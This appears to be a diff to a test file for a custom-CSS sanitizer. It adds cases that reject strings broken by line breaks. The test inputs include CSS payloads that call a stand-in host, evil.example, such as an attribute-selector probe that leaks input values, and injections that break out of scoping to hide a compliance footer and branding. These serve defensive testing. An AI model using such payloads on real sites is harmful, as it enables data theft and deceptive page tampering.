@@ -68,7 +68,6 @@ describe('sanitizeCustomCss', () => {
     );
     for (const probe of [
       'a { background: url("/\t/evil.example/p.gif") }',
-      "a { background: url('/\n/evil.example/p.gif') }",
       'a { background: url("/ /evil.example/p.gif") }',
       'a { background: url(/\t/evil.example/p.gif) }',
       'input[value^="a"] { background: url("/\t/evil.example/?v=a") }',
@@ -77,6 +76,9 @@ describe('sanitizeCustomCss', () => {
       expect(css, probe).toBe('');
       expect(removed, probe).toContain('url() pointing at another site');
     }
+    // A line break inside the quotes ends the string in the browser, so the
+    // whole stylesheet is refused before the url() is even looked at (US-536).
+    expect(sanitizeCustomCss("a { background: url('/\n/evil.example/p.gif') }").css).toBe('');
     expect(sanitizeCustomCss('a { background: url(/img/hero-1.webp?v=2) }').css).toBe(
       `${S} a { background: url(/img/hero-1.webp?v=2); }`
     );
@@ -148,6 +150,36 @@ describe('sanitizeCustomCss', () => {
       expect(css).toBe('');
       expect(removed[0]).toMatch(/unclosed|everything/);
     }
+  });
+
+  it('rejects a string broken by a line break, which the browser ends early (US-536)', () => {
+    // A browser ends a CSS string at an unescaped newline (a bad-string token,
+    // CSS Syntax 3 §4.3.5), so the `}` after it closes the scoped rule and the
+    // next rule is parsed at the top level, unscoped: here it would hide the
+    // compliance footer and the AgentBio branding outside the container.
+    // Escapes are refused, so a legitimate string can never contain one.
+    for (const lineBreak of ['\n', '\r', '\r\n', '\f']) {
+      const input = `a { content: "x${lineBreak}} footer, [data-branding] { display: none !important } b { c: "; }`;
+      const { css, removed } = sanitizeCustomCss(input);
+      expect(css).toBe('');
+      expect(removed[0]).toMatch(/unclosed/);
+    }
+    // The same in a single-quoted string, an attribute selector and a comment-free @media body.
+    for (const input of [
+      "a { content: 'x\n} footer { display: none } b { c: '; }",
+      'a[title="x\n"] { color: red }',
+      '@media screen { a { content: "x\n} footer { display: none } b { c: "; } }',
+    ]) {
+      expect(sanitizeCustomCss(input).css).toBe('');
+    }
+  });
+
+  it('still accepts line breaks between declarations and inside comments', () => {
+    const { css, removed } = sanitizeCustomCss(
+      'a {\r\n  color: red;\n  /* a note\n  over two lines */\n  content: "ok";\n}\n'
+    );
+    expect(css).toBe(`${S} a { color: red; content: "ok"; }`);
+    expect(removed).toEqual([]);
   });
 
   it('ignores braces inside strings and comments', () => {
